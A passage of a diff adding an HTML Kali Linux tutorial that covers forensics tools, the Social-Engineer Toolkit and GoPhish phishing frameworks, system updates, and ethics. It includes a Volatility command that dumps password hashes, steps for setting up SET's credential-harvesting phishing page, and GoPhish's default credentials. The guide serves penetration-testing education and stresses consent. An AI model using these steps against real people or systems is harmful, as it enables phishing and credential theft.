+        <p><strong>Usage:</strong> Create a new case, add a data source (disk image or local disk), and run various ingest modules to analyze file systems, web activity, emails, memory dumps, etc.</p>
+
+        <h3>B. Wireshark</h3>
+        <p>A powerful network protocol analyzer that lets you capture and interactively browse the data flowing on a computer network.</p>
+        <pre><code class="language-bash">sudo wireshark # Start Wireshark GUI
+# Or capture via command line:
+sudo tcpdump -i eth0 -w capture.pcap # Capture traffic on eth0 to a file</code></pre>
+        <p><strong>Usage:</strong> Select an interface to capture (e.g., `eth0`), apply display filters (e.g., `http`, `ip.addr == 192.168.1.1`), and analyze packet data.</p>
+
+        <h3>C. Volatility Framework</h3>
+        <p>An open-source memory forensics framework for extracting digital artifacts from volatile memory (RAM) dumps.</p>
+        <pre><code class="language-bash"># Common commands:
+vol.py -f memdump.raw imageinfo # Determine OS and Service Pack of memory dump
+vol.py -f memdump.raw --profile=Win7SP1x64 pslist # List running processes
+vol.py -f memdump.raw --profile=Win7SP1x64 hashdump # Dump password hashes from memory</code></pre>
+
+        <h2 id="social-engineering-tools">12. Social Engineering Tools</h2>
+        <p>Tools designed to assist in human-based attacks, often leveraging deception to gain access or information.</p>
+
+        <h3>A. Social-Engineer Toolkit (SET)</h3>
+        <p>An open-source penetration testing framework designed for social engineering. It includes a variety of attack vectors, such as spear-phishing, web attack vectors, and infectious media generator.</p>
+        <pre><code class="language-bash">setoolkit # Start SET</code></pre>
+        <p><strong>Usage:</strong> Follow the interactive menu to choose an attack (e.g., "Spear-Phishing Attack Vectors" -> "Credential Harvester Attack"). SET will guide you through setting up a malicious web page and sending emails.</p>
+        <div class="warning">
+            <strong>Warning:</strong> Social engineering attacks can have significant real-world consequences and are often illegal without explicit, documented consent from the target organization. Always adhere to ethical guidelines.
+        </div>
+
+        <h3>B. GoPhish</h3>
+        <p>An open-source phishing framework designed for businesses and penetration testers. It provides a simple and powerful way to conduct phishing campaigns, track results, and improve awareness.</p>
+        <pre><code class="language-bash"># Start GoPhish (may require navigating to its directory and running the executable)
+# Usually found in /opt/gophish/gophish
+/opt/gophish/gophish # Run the GoPhish executable
+
+# Access GoPhish UI: https://127.0.0.1:3333/ (default creds: admin / gophish)</code></pre>
+        <p><strong>Usage:</strong> Create landing pages, email templates, user groups, and then launch and monitor campaigns through the web interface.</p>
+
+        <h2 id="maintaining-and-updating-kali">13. Maintaining and Updating Kali</h2>
+        <p>Keeping your Kali Linux installation updated is crucial for security and access to the latest tools.</p>
+        <ul>
+            <li><strong>Update Package Lists:</strong> Fetches the latest package information from the repositories.
+                <pre><code class="language-bash">sudo apt update</code></pre>
+            </li>
+            <li><strong>Upgrade Installed Packages:</strong> Installs newer versions of packages that you already have.
+                <pre><code class="language-bash">sudo apt upgrade</code></pre>
+            </li>
+            <li><strong>Full Upgrade (Recommended occasionally):</strong> Performs a full upgrade, handling dependency changes and removing obsolete packages.
+                <pre><code class="language-bash">sudo apt full-upgrade</code></pre>
+            </li>
+            <li><strong>Clean Up:</strong> Removes downloaded package files and old kernels to free up space.
+                <pre><code class="language-bash">sudo apt clean
+sudo apt autoremove</code></pre>
+            </li>
+            <li><strong>Kernel Upgrade (if available):</strong>
+                <pre><code class="language-bash">sudo apt dist-upgrade</code></pre>
+            </li>
+            <li><strong>Kali-Specific Tool Updates:</strong> Some tools (especially those installed from GitHub) might require manual updates.</li>
+        </ul>
+
+        <h2 id="ethical-considerations">14. Ethical Considerations</h2>
+        <p>Kali Linux is a powerful tool. It's essential to use it ethically and legally.</p>
+        <ul>
+            <li><strong>Always Obtain Explicit Permission:</strong> Never use Kali Linux or its tools to test systems you do not own or have written, explicit authorization to test. This includes personal websites, public Wi-Fi, or corporate networks.</li>
+            <li><strong>Understand the Law:</strong> Familiarize yourself with local and international laws regarding computer crime (e.g., Computer Fraud and Abuse Act in the US, similar laws in other countries). Unauthorized access is illegal.</li>
+            <li><strong>Scope of Work:</strong> If performing testing for a client, always adhere strictly to the agreed-upon Scope of Work (SOW) and Rules of Engagement (ROE).</li>
+            <li><strong>Data Handling:</strong> If you gain access to sensitive data, treat it with the utmost confidentiality. Do not store, share, or misuse it.</li>
+            <li><strong>Responsible Disclosure:</strong> If you find a vulnerability in a system you are authorized to test, follow responsible disclosure guidelines.</li>
+            <li><strong>Continuous Learning:</strong> Stay updated with best practices, new tools, and the evolving legal landscape in cybersecurity.</li>
+        </ul>
+
+        <div class="tip">
+            <strong>Practice Makes Perfect!</strong>
+            <p>Kali Linux is an invaluable asset for cybersecurity professionals. The best way to learn and master its tools is through hands-on practice in a safe, controlled environment. Set up a virtual lab with vulnerable systems (e.g., Metasploitable, OWASP Juice Shop) and practice responsibly. Remember, knowledge is power, and with great power comes great responsibility.</p>
+        </div>
+    </div>
+</body>
+</html>
